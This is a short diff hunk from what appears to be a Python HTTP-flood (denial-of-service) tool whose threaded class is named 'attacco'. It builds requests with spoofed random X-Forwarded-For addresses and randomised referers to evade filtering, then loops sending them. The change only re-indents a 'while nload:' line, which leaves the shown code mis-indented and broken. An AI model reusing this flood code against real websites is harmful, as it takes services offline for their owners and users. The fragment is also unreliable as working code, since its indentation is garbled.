@@ -8297,7 +8297,7 @@ class attacco(threading.Thread):
         forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
         referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 2000)) + "\r\n"
 httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
-        while nload:
+while nload:
             time.sleep(1)
            
         while 1:
